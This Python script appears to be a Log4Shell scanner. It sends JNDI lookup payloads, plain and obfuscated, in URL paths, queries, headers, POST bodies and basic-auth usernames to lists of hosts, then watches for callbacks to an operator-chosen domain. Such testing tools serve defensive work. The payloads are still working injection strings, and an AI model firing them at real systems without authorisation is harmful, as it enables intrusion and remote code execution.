__author__ = 'Paul Morrison'
__credits__ = ""
__date__ = "Last updated on 2022-01-13"

import sys
import argparse
import requests
import logging
import os
from netaddr import IPNetwork # apt-get install python3-netaddr
import threading
import random
import socket
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import traceback
import base64

ips2scan = []

####
#### Tests to run
####

tests = []

# URLPath 
tests += [{ "path" : "/${jndi:ldap://SITESPECIFIC-urlpath-ORGANISATION.DOMAIN/a}" } ]

# URLQuery
tests += [{ "path" : "/?abc=${jndi:ldap://SITESPECIFIC-urlquery-ORGANISATION.DOMAIN/a}" } ]

# User Agent 
tests += [{ "headers" : { 'User-Agent' : '${jndi:ldap://SITESPECIFIC-ua-ORGANISATION.DOMAIN/a}' } }]

# X-Forwarded-For 
tests += [{ "headers" : { 'X-Forwarded-For' : '${jndi:ldap://SITESPECIFIC-xff-ORGANISATION.DOMAIN/a}' } }]

# User-Agent obfuscated
tests += [{ "headers" : { "User-Agent" : "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://SITESPECIFIC-obfs-ORGANISATION.DOMAIN/poc}" } }]

# Post Payload URL encoded
tests += [{ "postpayload" : "hobbit=${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://SITESPECIFIC-postu-ORGANISATION.DOMAIN/poc}" }]

# Post payload JSON
tests += [{ "postpayload" : '{"hobbit":"${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://SITESPECIFIC-postj-ORGANISATION.DOMAIN/poc}"}' }]

# Username basic auth
tests += [{ "auth" : "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://SITESPECIFIC-basic-ORGANISATION.DOMAIN/poc}" }]

##################################

""" Process IPs, cleaning up, and exapnding CIDR notations etc """
def processIps(ips):

	finalips = []

	for ip in ips:
		try:
			for i in IPNetwork(ip):
				finalips += [str(i)]
		except:
			''' This should cover hostnames '''
			finalips += [ip]

	''' Remove duplicates '''
	finalips = list(set(finalips))

	return finalips


class ThreadScanner(threading.Thread):

	def __init__(self, number, ports, organisation, domain):

		threading.Thread.__init__(self)
		self.number = number
		self.ports = ports
		self.organisation = organisation
		self.domain = domain

	def run(self):

		while len(ips2scan) != 0:

			ip = ips2scan.pop()

			logging.info("Thread %s, %s remaining - About to scan %s" % (self.number, len(ips2scan), ip))

			logging.debug("Thread %s, Going to scanning: %s" % (self.number, ip))

			''' See if hostname exists '''
			okToContinue = False
			try:
				s = socket.gethostbyname(ip)
				okToContinue = True
			except socket.gaierror:
				logging.debug("Failure: %s - DNS name doesn't resolve" % ip)

			if okToContinue:

				for port in self.ports.split(','):

					port = port.strip()

					''' Now do the request '''

					schemes = ['http', 'https']

					for scheme in schemes:

						if port == '80' and scheme == 'https':
							continue

						if port == '443' and scheme == 'http':
							continue
							
						for test in tests:
						
							if "path" in test:
								path = test["path"]
							else:
								path = "/"

							specialsauce = "test%s" % (random.randint(0,999999999))
								
							if "headers" in test:
								headers = test["headers"]
								for h in headers.keys():
									headers[h] = headers[h].replace("SITESPECIFIC", specialsauce)
									headers[h] = headers[h].replace("ORGANISATION", self.organisation)
									headers[h] = headers[h].replace("DOMAIN", self.domain)
							else:
								headers = { "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" }

							url = "%s://%s:%s%s" % (scheme, ip, port, path)
							timeout = False
							failure = False
							success = False
	
							url = url.replace("SITESPECIFIC", specialsauce)
							url = url.replace("ORGANISATION", self.organisation)
							url = url.replace("DOMAIN", self.domain)
	
							logging.info("Thread %s, %s - %s" % (self.number, ip, specialsauce))
							print("Thread %s, %s - %s" % (self.number, ip, specialsauce))
							
							try:
								if "auth" in test:
									mcuser = test["auth"]
									mcuser = mcuser.replace("SITESPECIFIC", specialsauce)
									mcuser = mcuser.replace("ORGANISATION", self.organisation)
									mcuser = mcuser.replace("DOMAIN", self.domain)
									r = requests.get(url, timeout=10, verify=False, headers=headers, allow_redirects=False, auth=(mcuser, "fakepassword"))
								else:
									if not "postpayload" in test:
										r = requests.get(url, timeout=10, verify=False, headers=headers, allow_redirects=False)
									else:
										mcdata = test["postpayload"]
										mcdata = mcdata.replace("SITESPECIFIC", specialsauce)
										mcdata = mcdata.replace("ORGANISATION", self.organisation)
										mcdata = mcdata.replace("DOMAIN", self.domain)
										r = requests.post(url, timeout=10, verify=False, headers=headers, allow_redirects=False, data=mcdata)
								logging.debug(url)
								logging.debug(r.request.headers)
								logging.debug(r.request.body)
								logging.debug(r.content)
								logging.debug(r.headers)
								success = True
							except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout):
								logging.debug("Thread %s, timeouted connecting with %s" % (self.number, url))
								timeout = True
							except (requests.exceptions.SSLError, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
								logging.debug("Thread %s, Something went wrong with scanning %s" % (self.number, url))
								failure = True
							except:
								logging.debug(traceback.print_exc())
								logging.debug("Thread %s, Something went wrong with scanning %s" % (self.number, url))
								failure = True
	
							if timeout or failure or r.status_code > 399:
								if timeout:
									logging.debug("Timeout: %s - %s" % ("TOU", url))
								elif failure:
									logging.debug("Failure: %s - %s" % ("FAI", url))
								else:
									''' Probably failed '''
									logging.debug("Failure: %s - %s" % (r.status_code, url))





if __name__ == '__main__':

	parser = argparse.ArgumentParser(description="Scan a bunch of IPs with some JNDI paylods/tests", epilog="""EXAMPLE:
		python3 jndiScanner.py -o pablo -i pabloTest.txt -d pablo.com -v
	""",formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument('-i', '--ips', help='File with list of IPs or Hostnames to test, can be FQDN, IP or CIDR notation, one per line')
	parser.add_argument('-t', '--threads', nargs='?', default='1', help="Number of Threads to run", type=int)
	parser.add_argument('-v', '--verbose', action='store_true', help='verbose levels of logging', default=False)
	parser.add_argument('-r', '--random', action='store_true', default=True, help='randomise order of IPs')
	parser.add_argument('-n', '--port', help='What port numbers, to hit, commma seperated. Default: 80,443', default='80,443')
	parser.add_argument('-o', '--organisation', help='What Organisation')
	parser.add_argument('-d', '--domain', help='What DNS domain')
	parser.add_argument('-x', '--output', help='Output file')

	args = parser.parse_args()

	''' Setup logger '''
	if args.verbose:
		if args.output:
			logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',handlers=[logging.StreamHandler(),logging.FileHandler(filename=args.output,mode='a')])		
		else:
			logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
	else:
		if args.output:
			logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',handlers=[logging.StreamHandler(),logging.FileHandler(filename=args.output,mode='a')])
		else:
			logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

	#logging.getLogger().addHandler(logging.StreamHandler(sys.stdout))

	if not args.organisation:
		logging.error("Put in an ORGANISATION, fool")
		sys.exit()

	if not args.domain:
		logging.error("Put in a domain")
		sys.exit()

	if not args.ips:
		logging.error("You don't have a list of IPs to scan against. Use help file if necessary")
		sys.exit()
	else:
		if not os.path.exists(args.ips):
			logging.error("Tne file %s doesn't exist." % (args.ips))
			sys.exit()



	''' Now read in the list of IPs '''
	ips = open(args.ips, 'r').readlines()
	ips = [ip.strip() for ip in ips]

	ips2scan = processIps(ips)

	if args.random:
		random.shuffle(ips2scan)

	logging.info("Going to process %s hosts/IPs with %s threads" % (len(ips), args.threads))
	if not args.verbose:
		logging.info("Only hits will be printed in non-verbose mode. No prints means no results")

	''' Now the magic '''
	for i in range(args.threads):
		ThreadScanner(i, args.port, args.organisation, args.domain).start()

